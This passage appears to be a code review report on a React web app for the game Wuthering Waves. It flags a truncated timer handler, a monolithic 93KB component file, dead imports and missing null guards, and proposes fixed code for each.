The function accepts both numbers and strings (including the em-dash `'—'`). This mixed-type interface suggests the frontend passes display-formatted values directly to a calculation function, coupling display format to business logic. If the display format changes (e.g., to `'N/A'` or a localized dash), this function silently returns `null` instead of showing an error.

**Recommendation:** The frontend should normalize the value to a number before calling this function. The `'—'` check should live in the UI layer, not in a data utility.

Wuthering Waves' official element names are: Spectro, Havoc, Fusion, Glacio, Electro, Aero. The data uses these correctly. ```

The `appcore-components.jsx` file is the monolithic UI component file for the entire app (~93KB). While many individual components are well-structured, there are significant **architectural**, **data flow**, and **cross-cutting** concerns. The `art-direction-engine-SKILL.md` is a design skill reference document and contains no executable code — it is excluded from actionable findings but noted as an orphaned/non-app file.

---

## CRITICAL Issues

### C-1: Truncated/Incomplete Function Body — `CountdownTimer` `handleFocus` Handler

**File:** `appcore-components.jsx`, near line ~470 (end of visible truncation)
**Problem:** The code is truncated mid-function: `const handleFocus = () => { updateTim` — this is a file viewing truncation, but the pattern reveals a real risk: the `handleFocus` callback references `updateTim` which appears to be `updateTimer`, but if this were ever accidentally saved in a truncated state, the entire component tree would crash. More importantly, the **event listener for `focus` is added but never shown to be cleaned up** in the visible portion, creating a potential memory leak.

**Severity:** CRITICAL (if truncation is real in source) / MEDIUM (if just context window — verify cleanup exists)

**Action Required:** Verify that the full source file contains:
1. Complete `handleFocus` callback body
2. A cleanup function in the `useEffect` return that calls `document.removeEventListener('visibilitychange', handleVisibilityChange)` AND `window.removeEventListener('focus', handleFocus)` AND `stopInterval()`

**Expected pattern (verify exists in full file):**
```jsx
// Inside the useEffect in CountdownTimer:
return () => {
  stopInterval();
  document.removeEventListener('visibilitychange', handleVisibilityChange);
  window.removeEventListener('focus', handleFocus);
};
```

## HIGH Issues

### H-1: Monolithic Component File — Architectural Scaling Problem

**File:** `appcore-components.jsx` — 93,291 bytes, single file
**Problem:** This single file contains ALL UI components: `Card`, `CardHeader`, `CardBody`, `CharacterDetailModal`, `WeaponDetailModal`, `TabErrorBoundary`, `AppErrorBoundary`, `TabButton`, `CountdownTimer`, `TabBackground`, `MaterialItem`, plus many more beyond the truncation point. At ~93KB this is:
- **Unmaintainable:** Any change requires loading and parsing the entire file
- **Bundle-splitting hostile:** Code-splitting at the route/tab level is impossible when all components share one module
- **Tree-shaking hostile:** Unused components cannot be eliminated
- **Merge-conflict prone:** Multiple developers will constantly conflict

**Severity:** HIGH

**Recommendation:** Split into domain-focused modules:
```
src/components/
  cards/        → Card, CardHeader, CardBody
  modals/       → CharacterDetailModal, WeaponDetailModal
  errors/       → TabErrorBoundary, AppErrorBoundary
  navigation/   → TabButton, TabBackground
  timers/       → CountdownTimer
  materials/    → MaterialItem
  index.js      → re-exports for backward compatibility
```

### H-2: Massive Import from `appcore-data.js` — Tight Coupling and Bundle Impact

**File:** `appcore-components.jsx`, lines 8–15
```jsx
import {
  HARD_PITY, SOFT_PITY_START, CHARACTER_DATA, WEAPON_DATA,
  DEFAULT_COLLECTION_IMAGES, CURRENT_BANNERS, haptic,
  RESONANCE_CHAIN_DATA, CHAR_BUFF_TABLE,
  MATERIAL_IMAGES, COMMON_MAT_TIERS, FORGERY_MAT_TIERS,
  RESONATOR_ASCENSION_COSTS, RESONATOR_EXP_COSTS, SKILL_UPGRADE_COSTS,
  WEAPON_ASCENSION_COSTS_5, WEAPON_ASCENSION_COSTS_4, WEAPON_EXP_COSTS_5, WEAPON_EXP_COSTS_4,
} from './appcore-data.js';
```

**Problem:**
1. **`HARD_PITY`, `SOFT_PITY_START`, `CURRENT_BANNERS`** are imported but never used in the visible 40,000 characters of the file. They may be used later in the truncated portion, but this should be verified — dead imports bloat the module graph.
2. **`haptic`** is a side-effect utility imported from a data module. A `haptic` feedback function does not belong in a data constants file — this is a cross-cutting concern that should live in a utilities module.
3. The components file directly reads from game data dictionaries (`CHARACTER_DATA[name]`, `WEAPON_DATA[name]`), meaning the **data schema IS the component contract**. Any change to the shape of `CHARACTER_DATA` entries will silently break multiple components with no type safety.

**Severity:** HIGH

**Recommended Fix for `haptic` location:**
```js
// src/utils/haptic.js (new file)
export const haptic = {
  light: () => {
    try { navigator?.vibrate?.(10); } catch(e) {}
  },
  medium: () => {
    try { navigator?.vibrate?.(25); } catch(e) {}
  },
};
```

**Recommended Fix for dead imports:** Audit and remove `HARD_PITY`, `SOFT_PITY_START`, `CURRENT_BANNERS` if unused in the full file.

### H-3: Data Access Without Defensive Guards — Silent Runtime Failures

**File:** `appcore-components.jsx`, multiple locations

**Problem:** Components access nested data properties from `appcore-data.js` dictionaries without sufficient guards. If the data contract changes or an entry is missing a field, the UI will crash.

**Example 1 — `CharacterDetailModal` line ~124:**
```jsx
const data = CHARACTER_DATA[name];
if (!data) return null;
```
This guards the top-level lookup, but then accesses deep properties without guards:
```jsx
const weaponData = WEAPON_DATA[data.bestWeapon];  // data.bestWeapon could be undefined
const weaponImg = DEFAULT_COLLECTION_IMAGES[data.bestWeapon]; // same
```

**Example 2 — Lines ~245-250, Ascension Materials:**
```jsx
<MaterialItem name={data.ascension.boss} qty={RESONATOR_ASCENSION_COSTS.boss} />
```
If `data.ascension` is `undefined` (missing from a character entry), this throws `Cannot read properties of undefined (reading 'boss')`.

**Example 3 — Lines ~256-259:**
```jsx
{COMMON_MAT_TIERS[data.ascension.common] && <>
```
Same issue — `data.ascension` must exist.

**Severity:** HIGH

**Fix — Add defensive access:**
```jsx
// CharacterDetailModal, after the null check on data:
const data = CHARACTER_DATA[name];
if (!data) return null;

const weaponData = data.bestWeapon ? WEAPON_DATA[data.bestWeapon] : null;
const weaponImg = data.bestWeapon ? DEFAULT_COLLECTION_IMAGES[data.bestWeapon] : null;

// For ascension section, wrap with guard:
{data.ascension && (
  <div>
    <h3 className="text-white font-bold text-sm mb-2 flex items-center gap-2">
      <TrendingUp size={14} className="text-emerald-400" /> Ascension Materials
    </h3>
    <div className="grid grid-cols-2 gap-1.5">
      {data.ascension.boss && <MaterialItem name={data.ascension.boss} qty={RESONATOR_ASCENSION_COSTS.boss} />}
      {data.ascension.specialty && <MaterialItem name={data.ascension.specialty} qty={RESONATOR_ASCENSION_COSTS.specialty} />}
      {data.ascension.common && COMMON_MAT_TIERS[data.ascension.common] && <>
        <MaterialItem name={COMMON_MAT_TIERS[data.ascension.common][0]} qty={RESONATOR_ASCENSION_COSTS.commonT3} />
        <MaterialItem name={COMMON_MAT_TIERS[data.ascension.common][1]} qty={RESONATOR_ASCENSION_COSTS.commonT4} />
      </>}
    </div>
  </div>
)}
```
